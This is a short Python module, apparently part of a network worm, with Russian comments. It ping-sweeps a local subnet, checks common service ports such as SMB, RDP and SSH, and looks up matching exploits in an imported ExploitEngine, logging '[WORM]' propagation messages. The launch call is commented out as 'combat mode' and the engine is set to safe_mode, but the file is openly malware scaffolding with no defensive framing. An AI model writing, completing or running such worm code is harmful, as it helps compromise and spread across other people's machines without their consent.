import socket
import subprocess
from exploit_engine import ExploitEngine

def scan_network(subnet="192.168.1.0/24"):
    # Простейший скан живых хостов (ping)
    import ipaddress
    live_hosts = []
    for ip in ipaddress.IPv4Network(subnet):
        ip_str = str(ip)
        try:
            res = subprocess.run(["ping", "-c", "1", "-W", "1", ip_str], stdout=subprocess.DEVNULL)
            if res.returncode == 0:
                live_hosts.append(ip_str)
        except Exception:
            continue
    return live_hosts

def scan_ports(host, ports=[22, 80, 445, 3389, 8080]):
    open_ports = []
    for port in ports:
        try:
            with socket.create_connection((host, port), timeout=1):
                open_ports.append(port)
        except Exception:
            continue
    return open_ports

def propagate():
    print("[WORM] Propagation wave started...")
    subnet = "192.168.1.0/24"  # TODO: autodetect
    hosts = scan_network(subnet)
    print(f"[WORM] Live hosts: {hosts}")
    engine = ExploitEngine(safe_mode=True)
    for host in hosts:
        ports = scan_ports(host)
        print(f"[WORM] Host {host} open ports: {ports}")
        for port in ports:
            # Пробуем найти и запустить эксплойт
            exploits = engine.search_exploits({"port": port})
            if exploits:
                print(f"[WORM] Found exploits for {host}:{port}: {[e['id'] for e in exploits]}")
                # В боевом режиме: engine.run_exploit_batch(exploits, host, port)
            else:
                print(f"[WORM] No exploits for {host}:{port}")
